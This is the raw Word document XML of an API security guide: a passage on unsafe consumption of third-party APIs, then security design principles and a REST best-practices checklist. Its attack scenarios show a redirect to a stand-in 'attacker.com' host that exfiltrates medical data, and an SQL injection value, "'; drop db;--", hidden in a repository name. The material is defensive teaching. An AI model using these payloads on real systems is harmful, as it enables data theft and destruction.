    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Blindly follows redirections;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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Does not limit the number of resources available to process third-party services responses;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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Does not implement timeouts for interactions with third-party services;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031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Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="192" w:after="192"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>Scenario #1</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relies on a third-party service to enrich user provided business addresses. When an address is supplied to the API by the end user, it is sent to the third-party service and the returned data is then stored on a local SQL-enabled database.</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Bad actors use the third-party service to store </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> payload associated with a business created by them. Then they go after the vulnerable API providing specific input that makes it pull their "malicious business" from the third-party service. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> payload ends up being executed by the database, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>exfiltrating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> data to an attacker's controlled server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F"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#2</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An API integrates with a third-party service provider to safely store sensitive user medical information. Data is sent over a secure connection using an HTTP request like the one below:</w:t>
      </w:r>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POST /user/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>store_phr_record</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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lastRenderedPageBreak/>
        <w:t>{</w:t>
      </w:r>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 xml:space="preserve">  "</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>genome</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "ACTAGTAG__TTGADDAAIICCTT…"</w:t>
      </w:r>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Bad actors found a way to compromise the third-party API and it starts responding with a </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>308 Permanent Redirect</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> to requests like the previous one.</w:t>
      </w:r>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HTTP/1.1 308 Permanent Redirect</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Location: https://attacker.com/</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Since the API blindly follows the third-party redirects, it will repeat the exact same request including the user's sensitive data, but this time to the attacker's server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="384" w:after="192"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:spacing w:val="-2"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>Scenario #3</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 xml:space="preserve">An attacker can prepare a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>git</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> repository named </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">'; drop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>db</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>;--</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>Now, when an integration from an attacked application is done with the malicious repository, SQL injection payload is used on an application that builds an SQL query believing the repository's name is safe input.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="384" w:after="154"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">How </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>To</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>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When evaluating service providers, assess their API security posture.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>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Ensure all API interactions happen over a secure communication channel (TLS).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="12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Always validate and properly sanitize data received from integrated APIs before using it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Maintain an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>allowlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of well-known locations integrated APIs may redirect yours to: do not blindly follow redirects.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D8031F" w:rsidRPr="00790A44" w:rsidRDefault="00D8031F"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jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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REST API Security isn’t an afterthought. It has to be an integral part of any development project and also for </w:t>
      </w:r>
      <w:hyperlink r:id="rId29" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>REST</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> APIs.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There are multiple ways to secure a RESTful API e.g. </w:t>
      </w:r>
      <w:hyperlink r:id="rId30" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t xml:space="preserve">basic </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>auth</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>OAuth</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, etc. but one thing is sure that RESTful APIs should be stateless – so request authentication/authorization should not depend on sessions.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Instead, each API request should come with some sort of authentication credentials that must be validated on the server for every request.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="0" w:after="450"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1. REST Security Design Principles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The paper </w:t>
      </w:r>
      <w:hyperlink r:id="rId32" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t xml:space="preserve">“The Protection of Information in Computer Systems” by Jerome </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>Saltzer</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t xml:space="preserve"> and Michael Schroeder</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, put forth eight design principles for securing information in computer systems, as described in the following sections:</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Least Privilege: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>An entity should only have the required set of permissions to perform the actions for which they are authorized, and no more. Permissions can be added as needed and should be revoked when no longer in use.</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Fail-Safe Defaults: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A user’s default access level to any resource in the system should be “denied” unless they’ve been granted a “permit” explicitly.</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The economy of Mechanism: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The design should be as simple as possible. All the component interfaces and the interactions between them should be simple enough to understand.</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lastRenderedPageBreak/>
        <w:t>Complete Mediation: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A system should validate access rights to all its resources to ensure that they’re allowed and should not rely on the cached permission matrix. If the access level to a given resource is being revoked, but that isn’t reflected in the permission matrix, it would violate the security.</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Open Design: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>This principle highlights the importance of building a system in an open manner—with no secret, confidential algorithms.</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Separation of Privilege: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Granting permissions to an entity should not be purely based on a single condition, a combination of conditions based on the type of resource is a better idea.</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Least Common Mechanism: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>It concerns the risk of sharing state among different components. If one can corrupt the shared state, it can then corrupt all the other components that depend on it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Psychological Acceptability: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>It states that security mechanisms should not make the resource more difficult to access than if the security mechanisms were not present. In short, security should not make worse the user experience.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="0" w:after="450"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2. Best Practices to Secure REST APIs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Below given points may serve as a checklist for designing the security mechanism for REST APIs.</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2.1. Keep it Simple</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Secure an API/System – just how secure it needs to be. Every time you make the solution more complex “unnecessarily,” you are also likely to leave a hole.</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2.2. Always Use HTTPS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By always using </w:t>
      </w:r>
      <w:hyperlink r:id="rId33" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>SSL</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, the authentication credentials can be simplified to a randomly generated access token. The token is delivered in the username field of HTTP Basic Auth. It’s relatively simple to use, and you get a lot of security features for free.</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If you use </w:t>
      </w:r>
      <w:hyperlink r:id="rId34" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>HTTP 2</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, to improve performance – you can even </w:t>
      </w:r>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>send multiple requests over a single connection</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>, that way you avoid the complete TCP and SSL handshake overhead on later requests.</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2.3. Use Password Hash</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Passwords must always be hashed to protect the system (or minimize the damage) even if it is compromised in some hacking attempts. There are many such </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>hashing algorithms</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> that can prove really effective for password security e.g. PBKDF2, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>bcrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>scrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
